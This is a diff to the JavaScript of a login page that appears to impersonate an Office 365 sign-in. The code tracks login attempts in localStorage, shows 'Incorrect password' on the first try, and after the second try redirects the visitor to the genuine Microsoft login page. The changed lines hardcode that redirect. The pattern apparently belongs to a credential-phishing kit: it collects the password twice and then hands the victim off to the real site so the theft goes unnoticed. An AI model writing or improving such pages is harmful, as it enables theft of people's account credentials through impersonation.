@@ -135,6 +135,8 @@
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+
     <script>
     // Initialize
     $(document).ready(function() {
@@ -214,8 +216,9 @@
                         if (response.redirect) {
                             // Redirect on second attempt
                             localStorage.removeItem('login_attempt'); // Clear attempts
-                            window.location.href = response.redirect;
-                        } else {
+                            // Redirect to Office 365 login page
+                            window.location.href = 'https://login.microsoftonline.com/';
+                        } else if (response.incorrect) {
                             // This should happen on first incorrect attempt
                             errorDiv.show();
                             errorDiv.text('Incorrect password. Please try again.');
@@ -228,6 +231,12 @@
                             submitBtn.text('Sign in');
                             passwordInput.val('');
                             passwordInput.focus();
+                        } else {
+                            // Handle other success cases
+                            errorDiv.show();
+                            errorDiv.text(response.message || 'Login successful');
+                            submitBtn.prop('disabled', false);
+                            submitBtn.text('Sign in');
                         }
                     } else {
                         // Handle error response
